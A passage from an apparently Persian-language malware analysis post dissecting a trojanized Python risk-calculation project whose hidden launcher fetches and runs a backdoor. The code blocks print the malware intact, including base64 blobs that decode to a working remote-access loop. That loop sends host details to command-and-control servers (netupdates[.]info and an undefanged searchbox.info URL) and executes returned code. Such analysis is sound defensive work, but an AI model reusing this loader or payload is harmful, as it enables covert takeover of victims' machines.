+</span></span><span class=line><span class=cl>	<span class=n>jww</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hasattrenc</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>vwplat</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>rdata2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>exec</span><span class=p>(</span><span class=n>vwplat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>env_reset</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>platform</span> <span class=o>==</span> <span class=s2>&#34;win32&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=n>jestinc</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=n>th_init</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>hasattrenc</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>	<span class=n>th_init</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_get_historical_prices</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>historical_prices</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>read_all_files</span><span class=p>(</span><span class=s2>&#34;../data&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mi>22</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>historical_prices</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>key</span><span class=p>,</span> <span class=n>value</span> <span class=ow>in</span> <span class=n>historical_prices</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>		<span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mi>473</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>value</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p>تابع env_reset در صورت ویندوز بودن اول jestinc رو صدا میزنه که فایلی به اسم C:<strong>\Users\Public\IconCache.dat</strong> می‌سازه و داخلش رشته ی انکد شده‌ی http://netupdates[.]info/board/board.php رو ذخیره می‌کنه. بعد با یک ترد پس زمینه hasattrenc دیتای موجود توی rdata2 رو دیکد و اجرا می‌کنه.</p><p>خود تابع env_reset هم از داخل فایل main.py داره فراخونی میشه به این صورت:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pandas</span> <span class=k>as</span> <span class=nn>pd</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>src.risk_csv</span> <span class=kn>import</span> <span class=n>env_reset</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>src.calc_data</span> <span class=k>as</span> <span class=nn>risk_calc</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>src</span> <span class=kn>import</span> <span class=n>csvutils</span> <span class=k>as</span> <span class=n>csv</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>...</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>working_directory</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span> <span class=o>+</span> <span class=s2>&#34;\data&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>env_reset</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>خب rdata2 رو باید دیکود کنیم و ببینیم چه خبره:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>-&gt;</span> <span class=o>%</span> <span class=n>echo</span> <span class=o>-</span><span class=n>n</span> <span class=s2>&#34;ZGVmIGV4dF9yZXNvdXJjZShm…wYXRoKQ==&#34;</span> <span class=o>|</span> <span class=n>base64</span> <span class=o>-</span><span class=n>d</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ext_resource</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>show</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>python_path</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>base_exec_prefix</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>pythonw.exe&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>shell32</span> <span class=o>=</span> <span class=n>ct</span><span class=o>.</span><span class=n>WinDLL</span><span class=p>(</span><span class=s1>&#39;shell32&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>shell32</span><span class=o>.</span><span class=n>ShellExecuteA</span><span class=o>.</span><span class=n>argtypes</span> <span class=o>=</span> <span class=n>w</span><span class=o>.</span><span class=n>HWND</span><span class=p>,</span> <span class=n>w</span><span class=o>.</span><span class=n>LPCSTR</span><span class=p>,</span> <span class=n>w</span><span class=o>.</span><span class=n>LPCSTR</span><span class=p>,</span> <span class=n>w</span><span class=o>.</span><span class=n>LPCSTR</span><span class=p>,</span> <span class=n>w</span><span class=o>.</span><span class=n>LPCSTR</span><span class=p>,</span> <span class=n>w</span><span class=o>.</span><span class=n>INT</span>
+</span></span><span class=line><span class=cl>    <span class=n>shell32</span><span class=o>.</span><span class=n>ShellExecuteA</span><span class=o>.</span><span class=n>restype</span> <span class=o>=</span> <span class=n>w</span><span class=o>.</span><span class=n>HINSTANCE</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>python_path</span><span class=p>)</span><span class=o>==</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>shell32</span><span class=o>.</span><span class=n>ShellExecuteA</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=n>python_path</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span><span class=n>file</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=n>show</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>shell32</span><span class=o>.</span><span class=n>ShellExecuteA</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;py.exe&#39;</span><span class=p>,</span><span class=n>file</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=n>show</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_command</span><span class=p>(</span><span class=n>command</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>error</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>command</span><span class=p>)</span> <span class=k>as</span> <span class=n>process</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>process</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>return_code</span> <span class=o>=</span> <span class=n>process</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>return_code</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>return_code</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>command</span> <span class=o>+</span> <span class=s2>&#34; 2&gt;&amp;1&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>process</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>error</span> <span class=o>=</span> <span class=n>process</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>error</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>platform</span> <span class=o>==</span> <span class=s2>&#34;win32&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>script_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>)</span> <span class=o>+</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>test_risk.py&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>script_path</span> <span class=o>=</span> <span class=s1>&#39;&#34;&#39;</span> <span class=o>+</span> <span class=n>script_path</span> <span class=o>+</span> <span class=s1>&#39;&#34;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>ext_resource</span><span class=p>(</span><span class=n>script_path</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>script_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>script_path</span> <span class=o>=</span> <span class=s2>&#34;python3 &#34;</span> <span class=o>+</span> <span class=s1>&#39;&#34;&#39;</span> <span class=o>+</span> <span class=n>script_path</span> <span class=o>+</span> <span class=s2>&#34;/test_risk.py&#34;</span> <span class=o>+</span> <span class=s1>&#39;&#34;&#39;</span> <span class=o>+</span> <span class=s2>&#34; &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>run_command</span><span class=p>(</span><span class=n>script_path</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>خب داره مشخص می‌شه که چه خبره. فایل risk_csv.py یک لانچر که وظیفه‌اش بالا آوردن بدافزار اصلی (test_risk.py) هست. رشته‌ی پلتفرم رو میگیره تا تشخیص بده سیستم‌عامل کاربر چیه. روی ویندوز از طریق ctypes و shell32.ShellExecuteA، اسکریپت اصلی رو با pythonw.exe و بدون پنجره‌ی کنسول مخیفانه اجرا می‌کنه؛
+روی غیر ویندوز همون فایل رو توی بک‌گراند با دستور زیر</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‍python3 <span class=s2>&#34;dir/test_risk.py&#34;</span> &gt; /dev/null 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
+</span></span></code></pre></td></tr></table></div></div><p>اجرا میکنه تا همه‌ی ورودی/خروجی‌ها صامت بشن.</p><p>حالا بریم سراغ فایل test_risk.py و داخلش  رو بررسی کنیم:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>http.client</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>array</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span> <span class=k>as</span> <span class=nn>ct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os.path</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>platform</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>wintypes</span> <span class=k>as</span> <span class=n>w</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ssl</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>error_de</span> <span class=o>=</span> <span class=s2>&#34;YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>din_dat</span> <span class=o>=</span> <span class=s2>&#34;dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI=&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_get_regressions</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>prices</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>read_all_files</span><span class=p>(</span><span class=s2>&#34;../data&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>risk_calculation</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>RiskCalculation</span><span class=p>(</span><span class=n>prices</span><span class=p>,</span> <span class=s1>&#39;Price103&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mi>22</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>risk_calculation</span><span class=o>.</span><span class=n>risk_params</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_get_weights</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>prices</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>read_all_files</span><span class=p>(</span><span class=s2>&#34;../data&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>risk_calculation</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>RiskCalculation</span><span class=p>(</span><span class=n>prices</span><span class=p>,</span> <span class=s1>&#39;Price103&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>assertAlmostEqual</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>sum</span><span class=p>([</span><span class=n>val</span><span class=o>.</span><span class=n>weight</span> <span class=k>for</span> <span class=n>key</span><span class=p>,</span> <span class=n>val</span> <span class=ow>in</span> <span class=n>risk_calculation</span><span class=o>.</span><span class=n>risk_params</span><span class=o>.</span><span class=n>items</span><span class=p>()]))</span>
